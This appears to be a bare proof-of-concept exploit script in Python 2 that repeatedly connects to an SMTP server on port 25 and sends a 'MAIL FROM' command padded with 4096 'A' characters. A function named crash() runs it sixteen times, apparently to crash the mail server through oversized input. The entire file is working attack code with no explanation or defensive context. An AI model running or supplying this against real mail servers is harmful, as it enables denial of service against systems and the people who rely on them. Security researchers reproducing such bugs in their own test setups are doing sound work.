import socket

host = 'localhost'
tld = 'mydomain.tld'
port = 25

def crash():    
 for i in range(0, 16):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.settimeout(32)    
  
  junk = 'A' * 4096
  
  print s.recv(8192)
  s.send('HELO ' + tld + '\r\n')
  print s.recv(8192)
  s.send('MAIL FROM ' + junk + '\r\n') 
  print s.recv(8192)
  
  s.close()
 

crash()

